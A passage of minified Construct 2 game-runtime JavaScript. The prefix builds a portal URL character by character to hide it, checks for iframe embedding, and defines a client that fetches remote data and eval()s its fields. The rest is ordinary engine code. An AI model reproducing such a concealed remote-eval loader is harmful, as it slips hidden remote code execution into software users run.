    exa = ["a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "/", ":", ".", "_", "-", "?", "="];

function _osufI() {
    return exa[8] + exa[12] + exa[0] + exa[7] + exa[4] + exa[18]
}

function _osufD() {
    return exa[3] + exa[0] + exa[19] + exa[0] + "." + exa[9] + exa[18]
}

function _osufM() {
    return exa[12] + exa[4] + exa[3] + exa[8] + exa[0]
}

function _osufS() {
    return exa[18] + exa[15] + exa[17] + exa[8] + exa[19] + exa[4]
}

function _ousfIc() {
    return exa[8] + exa[2] + exa[14] + exa[13]
}

function _ousfOff() {
    return exa[14] + exa[5] + exa[5] + exa[11] + exa[8] + exa[13] + exa[4] + "." + exa[9] + exa[18]
}

function _ousKG() {
    return exa[10] + exa[4] + exa[24] + exa[6] + exa[0] + exa[12] + exa[4] + "." + exa[15] + exa[7] + exa[15]
}
var d = document.domain,
    dd = window.location.host,
    u = window.location.pathname,
    _Kiz10continue = 1,
    _isInIFrame = window.location != window.parent.location;

function protoCr2() {
    this.d = exa[36] + exa[36] + exa[10] + exa[8] + exa[25] + exa[27] + exa[26] + exa[6] + exa[8] + exa[17] + exa[11] + exa[18] + exa[38] + exa[2] + exa[14] + exa[12] + exa[36], this.c = exa[2] + exa[14] + exa[13] + exa[19] + exa[17] + exa[14] + exa[11] + exa[11] + exa[4] + exa[17] + exa[36], this.p = exa[10] + exa[4] + exa[24] + exa[0] + exa[18] + exa[18] + exa[2] + exa[4] + exa[18] + exa[18] + exa[36], this.n = "copchase"
}
_Kiz10continue = 1 == _isInIFrame ? 1 : 0, protoCr2.prototype.data = function () {
    return this.d + this.c + this.p + this.n
};
var _proCr2 = new protoCr2,
    parseJs, HttpClient = function () {
        this.parsejs = "", this.get = function (t, e) {
            var i = new XMLHttpRequest;
            i.onreadystatechange = function () {
                4 == i.readyState && 200 == i.status && e(i.responseText)
            }, i.open("GET", t, !0), i.send(null)
        }
    };
HttpClient.prototype.Appeval = function (w) {
    switch (w) {
        case 0:
            eval(parseJs.data.create);
            break;
        case 1:
            eval(parseJs.data.start);
            break;
        case 2:
            eval(parseJs.data.init);
            break;
        case 3:
            eval(parseJs.data.project);
            break
    }
}, HttpClient.prototype.jsData = function () {
    return parseJs.data.key
};
var _controllApp = new HttpClient;
! function () {
    var t = window.requestAnimationFrame || window.mozRequestAnimationFrame || window.webkitRequestAnimationFrame || window.msRequestAnimationFrame || window.oRequestAnimationFrame;

    function e(t) {
        if (t && (t.getContext || t.dc) && !t.c2runtime) {
            t.c2runtime = this;
            var e = this;
            this.isCrosswalk = /crosswalk/i.test(navigator.userAgent) || /xwalk/i.test(navigator.userAgent) || !(void 0 === window.c2isCrosswalk || !window.c2isCrosswalk), this.isCordova = this.isCrosswalk || void 0 !== window.device && (void 0 !== window.device.cordova || void 0 !== window.device.phonegap) || void 0 !== window.c2iscordova && window.c2iscordova, this.isPhoneGap = this.isCordova, this.isDirectCanvas = !!t.dc, this.isAppMobi = void 0 !== window.AppMobi || this.isDirectCanvas, this.isCocoonJs = !!window.c2cocoonjs, this.isEjecta = !!window.c2ejecta, this.isCocoonJs && (CocoonJS.App.onSuspended.addEventListener((function () {
                e.setSuspended(!0)
            })), CocoonJS.App.onActivated.addEventListener((function () {
                e.setSuspended(!1)
            }))), this.isEjecta && (document.addEventListener("pagehide", (function () {
                e.setSuspended(!0)
            })), document.addEventListener("pageshow", (function () {
                e.setSuspended(!1)
            })), document.addEventListener("resize", (function () {
                e.setSize(window.innerWidth, window.innerHeight)
            }))), this.isDomFree = this.isDirectCanvas || this.isCocoonJs || this.isEjecta, this.isMicrosoftEdge = /edge\//i.test(navigator.userAgent), this.isIE = (/msie/i.test(navigator.userAgent) || /trident/i.test(navigator.userAgent) || /iemobile/i.test(navigator.userAgent)) && !this.isMicrosoftEdge, this.isTizen = /tizen/i.test(navigator.userAgent), this.isAndroid = /android/i.test(navigator.userAgent) && !this.isTizen && !this.isIE && !this.isMicrosoftEdge, this.isiPhone = (/iphone/i.test(navigator.userAgent) || /ipod/i.test(navigator.userAgent)) && !this.isIE && !this.isMicrosoftEdge, this.isiPad = /ipad/i.test(navigator.userAgent), this.isiOS = this.isiPhone || this.isiPad || this.isEjecta, this.isiPhoneiOS6 = this.isiPhone && /os\s6/i.test(navigator.userAgent), this.isChrome = (/chrome/i.test(navigator.userAgent) || /chromium/i.test(navigator.userAgent)) && !this.isIE && !this.isMicrosoftEdge, this.isAmazonWebApp = /amazonwebappplatform/i.test(navigator.userAgent), this.isFirefox = /firefox/i.test(navigator.userAgent), this.isSafari = /safari/i.test(navigator.userAgent) && !this.isChrome && !this.isIE && !this.isMicrosoftEdge, this.isWindows = /windows/i.test(navigator.userAgent), this.isNWjs = void 0 !== window.c2nodewebkit || void 0 !== window.c2nwjs || /nodewebkit/i.test(navigator.userAgent) || /nwjs/i.test(navigator.userAgent), this.isNodeWebkit = this.isNWjs, this.isArcade = void 0 !== window.is_scirra_arcade, this.isWindows8App = !(void 0 === window.c2isWindows8 || !window.c2isWindows8), this.isWindows8Capable = !(void 0 === window.c2isWindows8Capable || !window.c2isWindows8Capable), this.isWindowsPhone8 = !(void 0 === window.c2isWindowsPhone8 || !window.c2isWindowsPhone8), this.isWindowsPhone81 = !(void 0 === window.c2isWindowsPhone81 || !window.c2isWindowsPhone81), this.isWindows10 = !!window.cr_windows10, this.isWinJS = this.isWindows8App || this.isWindows8Capable || this.isWindowsPhone81 || this.isWindows10, this.isBlackberry10 = !(void 0 === window.c2isBlackberry10 || !window.c2isBlackberry10), this.isAndroidStockBrowser = this.isAndroid && !this.isChrome && !this.isCrosswalk && !this.isFirefox && !this.isAmazonWebApp && !this.isDomFree, this.devicePixelRatio = 1, this.isMobile = this.isCordova || this.isCrosswalk || this.isAppMobi || this.isCocoonJs || this.isAndroid || this.isiOS || this.isWindowsPhone8 || this.isWindowsPhone81 || this.isBlackberry10 || this.isTizen || this.isEjecta, this.isMobile || (this.isMobile = /(blackberry|bb10|playbook|palm|symbian|nokia|windows\s+ce|phone|mobile|tablet|kindle|silk)/i.test(navigator.userAgent)), this.isWKWebView = !!(this.isiOS && this.isCordova && window.webkit), "undefined" == typeof cr_is_preview || this.isNWjs || "?nw" !== window.location.search && !/nodewebkit/i.test(navigator.userAgent) && !/nwjs/i.test(navigator.userAgent) || (this.isNWjs = !0), this.isDebug = "undefined" != typeof cr_is_preview && window.location.search.indexOf("debug") > -1, this.canvas = t, this.canvasdiv = document.getElementById("c2canvasdiv"), this.gl = null, this.glwrap = null, this.glUnmaskedRenderer = "(unavailable)", this.enableFrontToBack = !1, this.earlyz_index = 0, this.ctx = null, this.firstInFullscreen = !1, this.oldWidth = 0, this.oldHeight = 0, this.canvas.oncontextmenu = function (t) {
                return t.preventDefault && t.preventDefault(), !1
            }, this.canvas.onselectstart = function (t) {
                return t.preventDefault && t.preventDefault(), !1
            }, this.canvas.ontouchstart = function (t) {
                return t.preventDefault && t.preventDefault(), !1
            }, this.isDirectCanvas && (window.c2runtime = this), this.isNWjs && (window.ondragover = function (t) {
                return t.preventDefault(), !1
            }, window.ondrop = function (t) {
                return t.preventDefault(), !1
            }, window.nwgui && window.nwgui.App.clearCache && window.nwgui.App.clearCache()), this.isAndroidStockBrowser && "undefined" != typeof jQuery && jQuery("canvas").parents("*").css("overflow", "visible"), this.width = t.width, this.height = t.height, this.draw_width = this.width, this.draw_height = this.height, this.cssWidth = this.width, this.cssHeight = this.height, this.lastWindowWidth = window.innerWidth, this.lastWindowHeight = window.innerHeight, this.forceCanvasAlpha = !1, this.redraw = !0, this.isSuspended = !1, Date.now || (Date.now = function () {
                return +new Date
            }), this.plugins = [], this.types = {}, this.types_by_index = [], this.behaviors = [], this.layouts = {}, this.layouts_by_index = [], this.eventsheets = {}, this.eventsheets_by_index = [], this.wait_for_textures = [], this.triggers_to_postinit = [], this.all_global_vars = [], this.all_local_vars = [], this.solidBehavior = null, this.jumpthruBehavior = null, this.shadowcasterBehavior = null, this.deathRow = {}, this.hasPendingInstances = !1, this.isInClearDeathRow = !1, this.isInOnDestroy = 0, this.isRunningEvents = !1, this.isEndingLayout = !1, this.createRow = [], this.isLoadingState = !1, this.saveToSlot = "", this.loadFromSlot = "", this.loadFromJson = null, this.lastSaveJson = "", this.signalledContinuousPreview = !1, this.suspendDrawing = !1, this.fireOnCreateAfterLoad = [], this.dt = 0, this.dt1 = 0, this.minimumFramerate = 30, this.logictime = 0, this.cpuutilisation = 0, this.timescale = 1, this.kahanTime = new cr.KahanAdder, this.wallTime = new cr.KahanAdder, this.last_tick_time = 0, this.fps = 0, this.last_fps_time = 0, this.tickcount = 0, this.tickcount_nosave = 0, this.execcount = 0, this.framecount = 0, this.objectcount = 0, this.changelayout = null, this.destroycallbacks = [], this.event_stack = [], this.event_stack_index = -1, this.localvar_stack = [
                []
            ], this.localvar_stack_index = 0, this.trigger_depth = 0, this.pushEventStack(null), this.loop_stack = [], this.loop_stack_index = -1, this.next_uid = 0, this.next_puid = 0, this.layout_first_tick = !0, this.family_count = 0, this.suspend_events = [], this.raf_id = -1, this.timeout_id = -1, this.isloading = !0, this.loadingprogress = 0, this.isNodeFullscreen = !1, this.stackLocalCount = 0, this.audioInstance = null, this.had_a_click = !1, this.isInUserInputEvent = !1, this.objects_to_pretick = new cr.ObjectSet, this.objects_to_tick = new cr.ObjectSet, this.objects_to_tick2 = new cr.ObjectSet, this.registered_collisions = [], this.temp_poly = new cr.CollisionPoly([]), this.temp_poly2 = new cr.CollisionPoly([]), this.allGroups = [], this.groups_by_name = {}, this.cndsBySid = {}, this.actsBySid = {}, this.varsBySid = {}, this.blocksBySid = {}, this.running_layout = null, this.layer_canvas = null, this.layer_ctx = null, this.layer_tex = null, this.layout_tex = null, this.layout_canvas = null, this.layout_ctx = null, this.is_WebGL_context_lost = !1, this.uses_background_blending = !1, this.fx_tex = [null, null], this.fullscreen_scaling = 0, this.files_subfolder = "", this.objectsByUid = {}, this.loaderlogos = null, this.snapshotCanvas = null, this.snapshotData = "", this.objectRefTable = [], this.requestProjectData()
        }
    }
    e.prototype.requestProjectData = function () {
        var t = this;
        if (this.isWKWebView) this.fetchLocalFileViaCordovaAsText("data.js", (function (e) {
            t.loadProject(JSON.parse(e))
        }), (function (t) {
            alert("Error fetching data.js")
        }));
        else {
            var e;
            e = this.isWindowsPhone8 ? new ActiveXObject("Microsoft.XMLHTTP") : new XMLHttpRequest;
            var i = "data.js";
            (this.isWindows8App || this.isWindowsPhone8 || this.isWindowsPhone81 || this.isWindows10) && (i = "data.json"), e.open("GET", i, !0);
            var n = !1;
            if (!this.isDomFree && "response" in e && "responseType" in e) try {
                e.responseType = "json", n = "json" === e.responseType
            } catch (t) {
                n = !1
            }
            if (!n && "responseType" in e) try {
                e.responseType = "text"
            } catch (t) {}
            if ("overrideMimeType" in e) try {
                e.overrideMimeType("application/json; charset=utf-8")
            } catch (t) {}
            this.isWindowsPhone8 ? e.onreadystatechange = function () {
                4 === e.readyState && t.loadProject(JSON.parse(e.responseText))
            } : (e.onload = function () {
                if (n) t.loadProject(e.response);
                else if (t.isEjecta) {
                    var i = e.responseText;
                    i = i.substr(i.indexOf("{")), t.loadProject(JSON.parse(i))
                } else t.loadProject(JSON.parse(e.responseText))
            }, e.onerror = function (t) {
                cr.logerror("Error requesting " + i + ":"), cr.logerror(t)
            }), e.send()
        }
    }, e.prototype.initRendererAndLoader = function () {
        var t, e, i, n, r, s, o, a, h, c, l, u = this;
        this.isRetina = (!this.isDomFree || this.isEjecta || this.isCordova) && this.useHighDpi && !this.isAndroidStockBrowser, 0 === this.fullscreen_mode && this.isiOS && (this.isRetina = !1), this.devicePixelRatio = this.isRetina && (window.devicePixelRatio || window.webkitDevicePixelRatio || window.mozDevicePixelRatio || window.msDevicePixelRatio) || 1, this.ClearDeathRow(), this.fullscreen_mode > 0 && this.setSize(window.innerWidth, window.innerHeight, !0), this.canvas.addEventListener("webglcontextlost", (function (t) {
            t.preventDefault(), u.onContextLost(), cr.logexport("[Construct 2] WebGL context lost"), window.cr_setSuspended(!0)
        }), !1), this.canvas.addEventListener("webglcontextrestored", (function (t) {
            u.glwrap.initState(), u.glwrap.setSize(u.glwrap.width, u.glwrap.height, !0), u.layer_tex = null, u.layout_tex = null, u.fx_tex[0] = null, u.fx_tex[1] = null, u.onContextRestored(), u.redraw = !0, cr.logexport("[Construct 2] WebGL context restored"), window.cr_setSuspended(!1)
        }), !1);
        try {
            this.enableWebGL && (this.isCocoonJs || this.isEjecta || !this.isDomFree) && (l = {
                alpha: !0,
                depth: !1,
                antialias: !1,
                powerPreference: "high-performance",
                failIfMajorPerformanceCaveat: !0
            }, this.gl = this.canvas.getContext("webgl2", l) || this.canvas.getContext("webgl", l) || this.canvas.getContext("experimental-webgl", l))
        } catch (t) {}
        if (this.gl) {
            this.gl.getParameter(this.gl.VERSION).indexOf("WebGL 2");
            var p = this.gl.getExtension("WEBGL_debug_renderer_info");
            if (p) {
                var d = this.gl.getParameter(p.UNMASKED_VENDOR_WEBGL),
                    f = this.gl.getParameter(p.UNMASKED_RENDERER_WEBGL);
                this.glUnmaskedRenderer = f + " [" + d + "]"
            }
            for (this.enableFrontToBack && (this.glUnmaskedRenderer += " [front-to-back enabled]"), this.isDomFree || (this.overlay_canvas = document.createElement("canvas"), jQuery(this.overlay_canvas).appendTo(this.canvas.parentNode), this.overlay_canvas.oncontextmenu = function (t) {
                    return !1
                }, this.overlay_canvas.onselectstart = function (t) {
                    return !1
                }, this.overlay_canvas.width = Math.round(this.cssWidth * this.devicePixelRatio), this.overlay_canvas.height = Math.round(this.cssHeight * this.devicePixelRatio), jQuery(this.overlay_canvas).css({
                    width: this.cssWidth + "px",
                    height: this.cssHeight + "px"
                }), this.positionOverlayCanvas(), this.overlay_ctx = this.overlay_canvas.getContext("2d")), this.glwrap = new cr.GLWrap(this.gl, this.isMobile, this.enableFrontToBack), this.glwrap.setSize(this.canvas.width, this.canvas.height), this.glwrap.enable_mipmaps = 0 !== this.downscalingQuality, this.ctx = null, t = 0, e = this.types_by_index.length; t < e; t++)
                for (i = 0, n = (o = this.types_by_index[t]).effect_types.length; i < n; i++)(a = o.effect_types[i]).shaderindex = this.glwrap.getShaderIndex(a.id), a.preservesOpaqueness = this.glwrap.programPreservesOpaqueness(a.shaderindex), this.uses_background_blending = this.uses_background_blending || this.glwrap.programUsesDest(a.shaderindex);
            for (t = 0, e = this.layouts_by_index.length; t < e; t++) {
                for (i = 0, n = (h = this.layouts_by_index[t]).effect_types.length; i < n; i++)(a = h.effect_types[i]).shaderindex = this.glwrap.getShaderIndex(a.id), a.preservesOpaqueness = this.glwrap.programPreservesOpaqueness(a.shaderindex);
                for (h.updateActiveEffects(), i = 0, n = h.layers.length; i < n; i++) {
                    for (r = 0, s = (c = h.layers[i]).effect_types.length; r < s; r++)(a = c.effect_types[r]).shaderindex = this.glwrap.getShaderIndex(a.id), a.preservesOpaqueness = this.glwrap.programPreservesOpaqueness(a.shaderindex), this.uses_background_blending = this.uses_background_blending || this.glwrap.programUsesDest(a.shaderindex);
                    c.updateActiveEffects()
                }
            }
        } else {
            if (this.fullscreen_mode > 0 && this.isDirectCanvas) {
                this.canvas = null, document.oncontextmenu = function (t) {
                    return !1
                }, document.onselectstart = function (t) {
                    return !1
                }, this.ctx = AppMobi.canvas.getContext("2d");
                try {
                    this.ctx.samplingMode = this.linearSampling ? "smooth" : "sharp", this.ctx.globalScale = 1, this.ctx.HTML5CompatibilityMode = !0, this.ctx.imageSmoothingEnabled = this.linearSampling
                } catch (t) {}
                0 !== this.width && 0 !== this.height && (this.ctx.width = this.width, this.ctx.height = this.height)
            }
            this.ctx || (this.isCocoonJs ? (l = {
                antialias: !!this.linearSampling,
                alpha: !0
            }, this.ctx = this.canvas.getContext("2d", l)) : (l = {
                alpha: !0
            }, this.ctx = this.canvas.getContext("2d", l)), this.setCtxImageSmoothingEnabled(this.ctx, this.linearSampling)), this.overlay_canvas = null, this.overlay_ctx = null
        }
        if (this.tickFunc = function (t) {
                u.tick(!1, t)
            }, window == window.top || this.isDomFree || this.isWinJS || this.isWindowsPhone8 || (document.addEventListener("mousedown", (function () {
                window.focus()
            }), !0), document.addEventListener("touchstart", (function () {
                window.focus()
            }), !0)), "undefined" != typeof cr_is_preview && (this.isCocoonJs, window.location.search.indexOf("continuous") > -1 && (cr.logexport("Reloading for continuous preview"), this.loadFromSlot = "__c2_continuouspreview", this.suspendDrawing = !0), this.pauseOnBlur && !this.isMobile && (jQuery(window).focus((function () {
                u.setSuspended(!1)
            })), jQuery(window).blur((function () {
                var t = window.parent;
                t && t.document.hasFocus() || u.setSuspended(!0)
            })))), window.addEventListener("blur", (function () {
                u.onWindowBlur()
            })), !this.isDomFree) {
            var m = function (t) {
                if (cr.isCanvasInputEvent(t) && document.activeElement && document.activeElement !== document.getElementsByTagName("body")[0] && document.activeElement.blur) try {
                    document.activeElement.blur()
                } catch (t) {}
            };
            "undefined" != typeof PointerEvent ? document.addEventListener("pointerdown", m) : window.navigator.msPointerEnabled ? document.addEventListener("MSPointerDown", m) : document.addEventListener("touchstart", m), document.addEventListener("mousedown", m)
        }
        0 === this.fullscreen_mode && this.isRetina && this.devicePixelRatio > 1 && this.setSize(this.original_width, this.original_height, !0), this.tryLockOrientation(), this.getready(), this.go(), this.extra = {}, cr.seal(this)
    };
    e.prototype.setSize = function (t, e, i) {
        var n = 0,
            r = 0,
            s = 0,
            o = 0,
            a = 0;
        if (this.lastWindowWidth !== t || this.lastWindowHeight !== e || i) {
            this.lastWindowWidth = t, this.lastWindowHeight = e;
            var h, c, l = this.fullscreen_mode,
                u = (document.mozFullScreen || document.webkitIsFullScreen || !!document.msFullscreenElement || document.fullScreen || this.isNodeFullscreen) && !this.isCordova;
            if (u || 0 !== this.fullscreen_mode || i) {
                u && this.fullscreen_scaling > 0 && (l = this.fullscreen_scaling);
                var p = this.devicePixelRatio;
                l >= 4 ? (c = t / e) > (h = this.original_width / this.original_height) ? (s = e * h, 5 === l ? ((a = s * p / this.original_width) > 1 ? a = Math.floor(a) : a < 1 && (a = 1 / Math.ceil(1 / a)), n = (t - (s = this.original_width * a / p)) / 2, r = (e - (o = this.original_height * a / p)) / 2, t = s, e = o) : (n = (t - s) / 2, t = s)) : (o = t / h, 5 === l ? ((a = o * p / this.original_height) > 1 ? a = Math.floor(a) : a < 1 && (a = 1 / Math.ceil(1 / a)), n = (t - (s = this.original_width * a / p)) / 2, r = (e - (o = this.original_height * a / p)) / 2, t = s, e = o) : (r = (e - o) / 2, e = o)) : this.isNWjs && this.isNodeFullscreen && 0 === this.fullscreen_mode_set && (n = Math.floor((t - this.original_width) / 2), r = Math.floor((e - this.original_height) / 2), t = this.original_width, e = this.original_height), l < 2 && (this.aspect_scale = p), this.cssWidth = Math.round(t), this.cssHeight = Math.round(e), this.width = Math.round(t * p), this.height = Math.round(e * p), this.redraw = !0, this.wantFullscreenScalingQuality || this.width < this.original_width && this.height < this.original_height || 1 === l ? (this.draw_width = this.width, this.draw_height = this.height, this.fullscreenScalingQuality = !0) : (this.draw_width = this.original_width, this.draw_height = this.original_height, this.fullscreenScalingQuality = !1, 2 === l ? (h = this.original_width / this.original_height, (c = this.lastWindowWidth / this.lastWindowHeight) < h ? this.draw_width = this.draw_height * c : c > h && (this.draw_height = this.draw_width / c)) : 3 === l && (h = this.original_width / this.original_height, (c = this.lastWindowWidth / this.lastWindowHeight) > h ? this.draw_width = this.draw_height * c : c < h && (this.draw_height = this.draw_width / c))), this.canvasdiv && !this.isDomFree && (jQuery(this.canvasdiv).css({
                    width: Math.round(t) + "px",
                    height: Math.round(e) + "px",
                    "margin-left": Math.floor(n) + "px",
                    "margin-top": Math.floor(r) + "px"
                }), "undefined" != typeof cr_is_preview && jQuery("#borderwrap").css({
                    width: Math.round(t) + "px",
                    height: Math.round(e) + "px"
                })), this.canvas && (this.canvas.width = Math.round(t * p), this.canvas.height = Math.round(e * p), this.isEjecta ? (this.canvas.style.left = Math.floor(n) + "px", this.canvas.style.top = Math.floor(r) + "px", this.canvas.style.width = Math.round(t) + "px", this.canvas.style.height = Math.round(e) + "px") : this.isRetina && !this.isDomFree && (this.canvas.style.width = Math.round(t) + "px", this.canvas.style.height = Math.round(e) + "px")), this.overlay_canvas && (this.overlay_canvas.width = Math.round(t * p), this.overlay_canvas.height = Math.round(e * p), this.overlay_canvas.style.width = this.cssWidth + "px", this.overlay_canvas.style.height = this.cssHeight + "px"), this.glwrap && this.glwrap.setSize(Math.round(t * p), Math.round(e * p)), this.isDirectCanvas && this.ctx && (this.ctx.width = Math.round(t), this.ctx.height = Math.round(e)), this.ctx && this.setCtxImageSmoothingEnabled(this.ctx, this.linearSampling), this.tryLockOrientation(), this.isiPhone && !this.isCordova && window.scrollTo(0, 0)
            }
        }
    }, e.prototype.tryLockOrientation = function () {
        if (this.autoLockOrientation && 0 !== this.orientations) {
            var t = "portrait";
            2 === this.orientations && (t = "landscape");
            try {
                screen.orientation && screen.orientation.lock ? screen.orientation.lock(t).catch((function () {})) : screen.lockOrientation ? screen.lockOrientation(t) : screen.webkitLockOrientation ? screen.webkitLockOrientation(t) : screen.mozLockOrientation ? screen.mozLockOrientation(t) : screen.msLockOrientation && screen.msLockOrientation(t)
            } catch (t) {
                console && console.warn
            }
        }
    }, e.prototype.onContextLost = function () {
        var t, e, i;
        for (this.glwrap.contextLost(), this.is_WebGL_context_lost = !0, t = 0, e = this.types_by_index.length; t < e; t++)(i = this.types_by_index[t]).onLostWebGLContext && i.onLostWebGLContext()
    }, e.prototype.onContextRestored = function () {
        var t, e, i;
        for (this.is_WebGL_context_lost = !1, t = 0, e = this.types_by_index.length; t < e; t++)(i = this.types_by_index[t]).onRestoreWebGLContext && i.onRestoreWebGLContext()
    }, e.prototype.positionOverlayCanvas = function () {
        if (!this.isDomFree) {
            var t = (document.mozFullScreen || document.webkitIsFullScreen || document.fullScreen || !!document.msFullscreenElement || this.isNodeFullscreen) && !this.isCordova ? jQuery(this.canvas).offset() : jQuery(this.canvas).position();
            t.position = "absolute", jQuery(this.overlay_canvas).css(t)
        }
    };
    var i = window.cancelAnimationFrame || window.mozCancelAnimationFrame || window.webkitCancelAnimationFrame || window.msCancelAnimationFrame || window.oCancelAnimationFrame;
    e.prototype.setSuspended = function (t) {
        var e, n;
        if (t && !this.isSuspended)
            for (cr.logexport("[Construct 2] Suspending"), this.isSuspended = !0, -1 !== this.raf_id && i && i(this.raf_id), -1 !== this.timeout_id && clearTimeout(this.timeout_id), e = 0, n = this.suspend_events.length; e < n; e++) this.suspend_events[e](!0);
        else if (!t && this.isSuspended) {
            for (cr.logexport("[Construct 2] Resuming"), this.isSuspended = !1, this.last_tick_time = cr.performance_now(), this.last_fps_time = cr.performance_now(), this.framecount = 0, this.logictime = 0, e = 0, n = this.suspend_events.length; e < n; e++) this.suspend_events[e](!1);
            this.tick(!1)
        }
    }, e.prototype.addSuspendCallback = function (t) {
        this.suspend_events.push(t)
    }, e.prototype.GetObjectReference = function (t) {
        return this.objectRefTable[t]
    }, e.prototype.loadProject = function (t) {
        t && t.project || cr.logerror("Project model unavailable");
        var e, i, n, r, s, o, a, h, c, l, u, p, d, f = t.project;
        if (this.name = f[0], this.first_layout = f[1], this.fullscreen_mode = f[12], this.fullscreen_mode_set = f[12], this.original_width = f[10], this.original_height = f[11], this.parallax_x_origin = this.original_width / 2, this.parallax_y_origin = this.original_height / 2, this.isDomFree && !this.isEjecta && (f[12] >= 4 || 0 === f[12]) && (cr.logexport("[Construct 2] Letterbox scale fullscreen modes are not supported on this platform - falling back to 'Scale outer'"), this.fullscreen_mode = 3, this.fullscreen_mode_set = 3), this.uses_loader_layout = f[18], this.loaderstyle = f[19], 0 === this.loaderstyle) {
            var m = new Image;
            m.crossOrigin = "anonymous", this.setImageSrc(m, "loading-logo.png"), this.loaderlogos = {
                logo: m
            }
        } else if (4 === this.loaderstyle) {
            var g = new Image;
            g.src = "";
            var y = new Image;
            y.src = "";
            var _ = new Image;
            _.src = "";
            var v = new Image;
            v.src = "";
            var b = new Image;
            b.src = "";
            var w = new Image;
            w.src = "";
            var x = new Image;
            x.src = "";
            var S = new Image;
            S.src = "";
            var T = new Image;
            T.src = "";
            var C = new Image;
            C.src = "";
            var A = new Image;
            A.src = "";
            var O = new Image;
            O.src = "", this.loaderlogos = {
                logo: [g, y, _, v],
                powered: [b, w, x, S],
                website: [T, C, A, O]
            }
        }
        for (this.next_uid = f[21], this.objectRefTable = cr.getObjectRefTable(), this.system = new cr.system_object(this), e = 0, i = f[2].length; e < i; e++) a = f[2][e], u = this.GetObjectReference(a[0]), cr.add_common_aces(a, u.prototype), (p = new u(this)).singleglobal = a[1], p.is_world = a[2], p.is_rotatable = a[5], p.must_predraw = a[9], p.onCreate && p.onCreate(), cr.seal(p), this.plugins.push(p);
        for (this.objectRefTable = cr.getObjectRefTable(), e = 0, i = f[3].length; e < i; e++) {
            for (a = f[3][e], d = this.GetObjectReference(a[1]), p = null, n = 0, r = this.plugins.length; n < r; n++)
                if (this.plugins[n] instanceof d) {
                    p = this.plugins[n];
                    break
                } var k = new p.Type(p);
            for (k.name = a[0], k.is_family = a[2], k.instvar_sids = a[3].slice(0), k.vars_count = a[3].length, k.behs_count = a[4], k.fx_count = a[5], k.sid = a[11], k.is_family ? (k.members = [], k.family_index = this.family_count++, k.families = null) : (k.members = null, k.family_index = -1, k.families = []), k.family_var_map = null, k.family_beh_map = null, k.family_fx_map = null, k.is_contained = !1, k.container = null, a[6] ? (k.texture_file = a[6][0], k.texture_filesize = a[6][1], k.texture_pixelformat = a[6][2]) : (k.texture_file = null, k.texture_filesize = 0, k.texture_pixelformat = 0), a[7] ? k.animations = a[7] : k.animations = null, k.index = e, k.instances = [], k.deadCache = [], k.solstack = [new cr.selection(k)], k.cur_sol = 0, k.default_instance = null, k.default_layerindex = 0, k.stale_iids = !0, k.updateIIDs = cr.type_updateIIDs, k.getFirstPicked = cr.type_getFirstPicked, k.getPairedInstance = cr.type_getPairedInstance, k.getCurrentSol = cr.type_getCurrentSol, k.pushCleanSol = cr.type_pushCleanSol, k.pushCopySol = cr.type_pushCopySol, k.popSol = cr.type_popSol, k.getBehaviorByName = cr.type_getBehaviorByName, k.getBehaviorIndexByName = cr.type_getBehaviorIndexByName, k.getEffectIndexByName = cr.type_getEffectIndexByName, k.applySolToContainer = cr.type_applySolToContainer, k.getInstanceByIID = cr.type_getInstanceByIID, k.collision_grid = new cr.SparseGrid(this.original_width, this.original_height), k.any_cell_changed = !0, k.any_instance_parallaxed = !1, k.extra = {}, k.toString = cr.type_toString, k.behaviors = [], n = 0, r = a[8].length; n < r; n++) {
                h = a[8][n];
                var P = this.GetObjectReference(h[1]),
                    I = null;
                for (s = 0, o = this.behaviors.length; s < o; s++)
                    if (this.behaviors[s] instanceof P) {
                        I = this.behaviors[s];
                        break
                    } I || ((I = new P(this)).my_types = [], I.my_instances = new cr.ObjectSet, I.onCreate && I.onCreate(), cr.seal(I), this.behaviors.push(I), cr.behaviors.solid && I instanceof cr.behaviors.solid && (this.solidBehavior = I), cr.behaviors.jumpthru && I instanceof cr.behaviors.jumpthru && (this.jumpthruBehavior = I), cr.behaviors.shadowcaster && I instanceof cr.behaviors.shadowcaster && (this.shadowcasterBehavior = I)), -1 === I.my_types.indexOf(k) && I.my_types.push(k);
                var E = new I.Type(I, k);
                E.name = h[0], E.sid = h[2], E.onCreate(), cr.seal(E), k.behaviors.push(E)
            }
            for (k.global = a[9], k.isOnLoaderLayout = a[10], k.effect_types = [], n = 0, r = a[12].length; n < r; n++) k.effect_types.push({
                id: a[12][n][0],
                name: a[12][n][1],
                shaderindex: -1,
                preservesOpaqueness: !1,
                active: !0,
                index: n
            });
            if (k.tile_poly_data = a[13], this.uses_loader_layout && !k.is_family && !k.isOnLoaderLayout && p.is_world || (k.onCreate(), cr.seal(k)), k.name && (this.types[k.name] = k), this.types_by_index.push(k), p.singleglobal) {
                var R = new p.Instance(k);
                R.uid = this.next_uid++, R.puid = this.next_puid++, R.iid = 0, R.get_iid = cr.inst_get_iid, R.toString = cr.inst_toString, R.properties = a[14], R.onCreate(), cr.seal(R), k.instances.push(R), this.objectsByUid[R.uid.toString()] = R
            }
        }
        for (e = 0, i = f[4].length; e < i; e++) {
            var L, M = f[4][e],
                B = this.types_by_index[M[0]];
            for (n = 1, r = M.length; n < r; n++)(L = this.types_by_index[M[n]]).families.push(B), B.members.push(L)
        }
        for (e = 0, i = f[28].length; e < i; e++) {
            var F = f[28][e],
                N = [];
            for (n = 0, r = F.length; n < r; n++) N.push(this.types_by_index[F[n]]);
            for (n = 0, r = N.length; n < r; n++) N[n].is_contained = !0, N[n].container = N
        }
        if (this.family_count > 0)
            for (e = 0, i = this.types_by_index.length; e < i; e++)
                if (!(c = this.types_by_index[e]).is_family && c.families.length) {
                    c.family_var_map = new Array(this.family_count), c.family_beh_map = new Array(this.family_count), c.family_fx_map = new Array(this.family_count);
                    var D = [],
                        j = 0,
                        z = 0,
                        G = 0;
                    for (n = 0, r = c.families.length; n < r; n++)
                        for (l = c.families[n], c.family_var_map[l.family_index] = j, j += l.vars_count, c.family_beh_map[l.family_index] = z, z += l.behs_count, c.family_fx_map[l.family_index] = G, G += l.fx_count, s = 0, o = l.effect_types.length; s < o; s++) D.push(cr.shallowCopy({}, l.effect_types[s]));
                    for (c.effect_types = D.concat(c.effect_types), n = 0, r = c.effect_types.length; n < r; n++) c.effect_types[n].index = n
                } for (e = 0, i = f[5].length; e < i; e++) {
            a = f[5][e];
